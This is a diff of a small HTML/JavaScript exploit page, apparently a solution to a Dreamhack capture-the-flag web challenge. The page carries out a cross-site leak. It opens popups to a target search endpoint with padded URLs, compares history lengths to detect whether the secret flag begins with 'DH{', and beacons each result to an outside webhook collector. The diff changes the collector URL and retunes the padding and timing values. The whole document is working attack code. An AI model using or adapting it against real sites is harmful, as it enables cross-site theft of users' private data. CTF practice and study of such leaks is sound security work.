@@ -1,22 +1,21 @@
 <!doctype html><meta charset="utf-8"><body><script>
-const T="http://localhost",C="https://zprdbfg.request.dreamhack.games";
+const T="http://localhost",C="https://webhooksite.net/674fdaef-b325-4a34-8c2f-244a8c43aab4";
 const SELF="https://niu0102.github.io/aaaa.html?blank=1";
 const L=(t,d)=>new Image().src=C+"/"+t+"?d="+encodeURIComponent(JSON.stringify(d))+"&t="+Date.now();
 const F=(p,pad)=>`${T}/find.php?search=${encodeURIComponent(p)}&w=${"A".repeat(pad)}&h=`;
 function P(u){return new Promise(r=>{
   const w=open("about:blank","p","width=150,height=150");
   setTimeout(()=>{try{w.location=u}catch(e){}},50);
-  setTimeout(()=>{try{w.location=SELF}catch(e){}},1800);
+  setTimeout(()=>{try{w.location=SELF}catch(e){}},1600);
   setTimeout(()=>{let h;try{h=w.history.length}catch(e){h="SE"}
-    try{w.close()}catch(e){}r(h)},2800);
+    try{w.close()}catch(e){}r(h)},2500);
 });}
 (async()=>{
   if(location.search.includes("blank"))return;
-  // 각 패딩에서 DH{(매칭) 와 zzz(노매칭) 를 나란히 비교
-  for(const pad of [1850,1900,1930,1960,1990,2020]){
-    const a=await P(F("DH{",pad)); await new Promise(r=>setTimeout(r,400));
-    const b=await P(F("zzz",pad)); await new Promise(r=>setTimeout(r,400));
-    L("c",{pad,DHbrace:a,zzz:b});
+  for(const pad of [2050,2100,2150,2200,2250,2300,2350,2400]){
+    const a=await P(F("DH{",pad)); await new Promise(r=>setTimeout(r,350));
+    const b=await P(F("zzz",pad)); await new Promise(r=>setTimeout(r,350));
+    L("c",{pad,DH:a,zz:b});
   }
   L("done",{});
 })();
